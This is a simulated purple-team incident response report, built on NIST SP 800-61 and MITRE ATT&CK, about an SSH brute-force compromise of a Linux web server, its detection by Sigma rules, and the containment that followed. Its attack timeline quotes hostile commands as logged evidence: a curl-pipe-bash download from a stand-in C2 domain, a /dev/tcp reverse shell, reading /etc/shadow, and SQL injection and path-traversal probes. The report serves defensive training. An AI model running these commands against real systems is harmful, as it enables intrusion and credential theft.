# Incident Response Report — INC-2026-1120-001 (Simulated Purple Team Exercise)

> **Framework:** NIST SP 800-61 Rev. 2 (*Computer Security Incident Handling Guide*) & MITRE ATT&CK v15  
> **Classification:** Lab Simulation / Portfolio Exercise  
> **Analyst:** Pedro Henrique Vidal (`PH-Vidal`)  
> **Affected Asset:** `web-prod-01` (Linux Application Server)  
> **Overall Severity:** **CRITICAL**

---

## 1. Preparation (Pre-Incident Posture)

Before the simulated intrusion, the SOC deployed a **Detection-as-Code** pipeline consisting of:
- **Telemetry Ingestion:** Centralized collection of Linux SSH logs (`auth.log`), Nginx access logs (`access.log`), and Linux process execution audit telemetry (`linux_audit.jsonl`), normalized to an ECS-inspired schema.
- **Versioned Sigma Rules:** 8 peer-reviewed, unit-tested detection rules covering Initial Access, Reconnaissance, Credential Access, Execution, Persistence, and Privilege Escalation (`rules/*.yml`).
- **Threat Intelligence Feed:** Local IOC feed (`threat_intel/ioc_feed.json`) tracking known brute-force clusters, AppSec scanners, and C2 infrastructure.
- **Documented SOC Playbooks:** Pre-approved containment procedures (`docs/playbooks.md`, `PB-001` through `PB-006`).

---

## 2. Detection & Analysis

### 2.1 Executive Summary
On **2026-11-20 between 14:11:00 UTC and 14:13:25 UTC**, the Detection-as-Code engine triggered **8 high-fidelity alerts** (with zero false positives on concurrent benign traffic) across three correlated phases:
1. **External Web Reconnaissance & Exploitation Probes** from `203.0.113.45` (matched TI actor `SIM-TA-02`).
2. **SSH Brute Force Leading to Account Compromise** of user `deploy` on `web-prod-01` from `198.51.100.77` (matched TI actor `SIM-TA-01`).
3. **Post-Exploitation Execution, Credential Access, and Persistence** under the compromised `deploy` session, culminating in a reverse shell to C2 `192.0.2.99:4444` (`SIM-TA-03`), `/etc/shadow` access, and creation of a sudo-privileged backdoor account `svc_backup_tmp`.

### 2.2 Attack Timeline (UTC)

| Time (UTC) | Source | Event / Observation | Sigma Rule Triggered | MITRE ATT&CK |
| :--- | :--- | :--- | :--- | :--- |
| `14:11:00`–`14:11:48` | `auth.log` | 7 failed SSH logins from `198.51.100.77` targeting `root`, `admin`, `ubuntu`, `postgres`, `deploy` | `ssh_brute_force.yml` | `T1110.001` |
| `14:11:10`–`14:11:22` | `access.log` | 4 probes (`/.env`, `/.git/config`, `/backup.sql`, `/wp-login.php`) from `203.0.113.45` (all HTTP 404) | `web_sensitive_file_scan.yml` | `T1595.003` |
| `14:11:35`–`14:11:42` | `access.log` | SQL Injection probes (`' OR '1'='1`, `UNION SELECT`) from `203.0.113.45` (`sqlmap/1.8`) | `web_sqli_attempt.yml` | `T1190` |
| `14:11:55` | `access.log` | Path traversal attempt (`/download?file=../../../../etc/passwd`) from `203.0.113.45` (HTTP 403) | `web_path_traversal.yml` | `T1190` |
| `14:12:15` | `auth.log` | **Successful SSH password login** for `deploy` from `198.51.100.77` immediately after brute force | `ssh_compromise_correlation.yml` | `T1110`, `T1078` |
| `14:12:30` | `linux_audit.jsonl` | `deploy` executed `curl -fsSL http://c2.malicious-lab.example/stage.sh \| bash` | `linux_reverse_shell.yml` | `T1059.004` |
| `14:12:45` | `linux_audit.jsonl` | `deploy` spawned interactive reverse shell (`bash -i >& /dev/tcp/192.0.2.99/4444 0>&1`) | `linux_reverse_shell.yml` | `T1059.004` |
| `14:13:05` | `linux_audit.jsonl` | `deploy` executed `cat /etc/shadow` | `linux_credential_access.yml` | `T1003.008` |
| `14:13:25` | `linux_audit.jsonl` | `root` created backdoor account `svc_backup_tmp` and added it to `sudo` group | `linux_backdoor_user.yml` | `T1136.001`, `T1548.003` |

### 2.3 Benign Activity Verified (True Negative Validation)
During the same window, the detection engine properly suppressed known-benign telemetry without analyst fatigue:
- Legitimate SSH logins from internal admins (`alice`, `bob`, `ci-runner` on `10.0.1.0/24`).
- Kubernetes `/health` probe matching exclusion filter `filter_healthcheck`.
- Scheduled backup job by `backup_agent` reading `/etc/shadow` (`filter_legit_backup`).
- Authorized user provisioning by `ansible_provisioner` (`filter_provisioning`).

### 2.4 Indicators of Compromise (IOCs)

| Type | Indicator | Classification | Threat Intel Context | Action Taken |
| :--- | :--- | :--- | :--- | :--- |
| IPv4 | `198.51.100.77` | Public (RFC 5737 Lab) | `SIM-TA-01` — SSH Brute Force Botnet (High) | Blocked ingress |
| IPv4 | `203.0.113.45` | Public (RFC 5737 Lab) | `SIM-TA-02` — Automated AppSec Scanner (High) | Blocked at WAF |
| IPv4 | `192.0.2.99` | Public (RFC 5737 Lab) | `SIM-TA-03` — Post-Exploitation C2 (Critical) | Blocked egress |
| Domain | `c2.malicious-lab.example` | External Domain | Known dropper/C2 domain | DNS sinkholed |
| Account | `svc_backup_tmp` | Local Linux User | Unauthorized sudo persistence account | Locked & removed |

---

## 3. Containment, Eradication & Recovery

### 3.1 Containment (`PB-001`, `PB-004`, `PB-006`)
- **Network Isolation:** Quarantined `web-prod-01` into an isolated forensic security group blocking all ingress/egress except SOC forensic jump host.
- **Perimeter Blocks:** Blocked `198.51.100.77`, `203.0.113.45`, and `192.0.2.99` at firewall/WAF and sinkholed `c2.malicious-lab.example`.
- **Identity Containment:** Locked `deploy` and `svc_backup_tmp`; terminated active sessions.

### 3.2 Eradication
- Preserved volatile telemetry, `auth.log`, `access.log`, `linux_audit.jsonl`, and disk snapshot for post-mortem analysis.
- Treated `web-prod-01` as fully compromised due to `root`-level persistence (`svc_backup_tmp`) and `/etc/shadow` access.
- Rotated credentials for `deploy`, all local accounts, SSH keys, and database/API secrets accessible from `web-prod-01`.

### 3.3 Recovery
- Re-provisioned `web-prod-01` from a hardened immutable base image with:
  - SSH password authentication disabled (`PasswordAuthentication no`).
  - SSH ingress restricted exclusively to corporate bastion/VPN CIDR (`10.0.1.0/24`).
  - Outbound egress allowlisting enforced (blocking direct arbitrary TCP/4444 callbacks).
- Verified clean health checks and 24-hour enhanced SOC monitoring before restoring production traffic.

---

## 4. Post-Incident Activity (Lessons Learned)

1. **Root Cause:** Password-based SSH authentication was exposed publicly on `web-prod-01` with a weak credential on service account `deploy`.
2. **What Worked Well:**
   - Temporal correlation (`ssh_compromise_correlation.yml`) immediately distinguished a routine brute-force scan from a confirmed account takeover.
   - Threat Intelligence enrichment automatically elevated severity and linked the host reverse shell to C2 infrastructure `192.0.2.99`.
   - Sigma exclusion filters prevented false positives from `backup_agent`, `ansible_provisioner`, and `/health` checks.
3. **Follow-Up Engineering Actions:**
   - [ ] Enforce SSH key-only + MFA/bastion policy across all Linux fleet via Terraform/Ansible.
   - [ ] Add WAF rule blocking `sqlmap` user-agents and automated dotfile scans at the edge.
   - [ ] Expand Sigma rule suite to monitor `cron` / `systemd` persistence (`T1053.003`, `T1543.002`) and AWS CloudTrail anomalies (next lab).
